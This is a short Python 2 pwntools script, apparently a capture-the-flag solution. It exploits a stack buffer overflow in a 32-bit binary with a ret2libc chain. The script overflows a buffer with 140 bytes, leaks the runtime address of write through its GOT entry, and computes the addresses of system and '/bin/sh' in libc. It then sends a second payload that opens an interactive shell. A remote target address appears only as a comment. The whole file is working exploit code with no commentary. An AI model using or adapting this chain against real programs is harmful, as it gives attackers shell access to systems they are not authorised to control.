#-*-coding:utf-8-*-
from pwn import *
p = process('./elf')
#p = remote("111.198.29.45","31733")
elf = ELF('./elf')
# libc = elf.libc
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
write_plt = elf.plt['write']
print "write_plt: " + hex(write_plt)
# print hex(elf.symbols['write'])
write_got = elf.got['write']
print "write_got: " + hex(write_got)
write_libc = libc.symbols['write']
print "write_libc: " + hex(write_libc)
system_libc = libc.symbols['system']
print "system_libc: " + hex(system_libc)
vulnfun = 0x804844B
# pause()
#write(1,write_got,4)
p.recv()  
payload = 140*'a' + p32(write_plt) + p32(vulnfun)
payload += p32(1) + p32(write_got) + p32(4)
p.sendline(payload)
write_addr = u32(p.recv(4))
print "write_addr: " + hex(write_addr)
pause()
offset = write_addr - write_libc
print "offset="+hex(offset)
system_addr = offset + system_libc
print "system_addr: "+hex(system_addr)
binsh = libc.search("/bin/sh").next()
binsh_addr = offset + binsh
print "binsh_addr: " + hex(binsh_addr)
payload = 140*'a' + p32(system_addr) + p32(vulnfun) + p32(binsh_addr)
p.sendline(payload)
p.interactive()
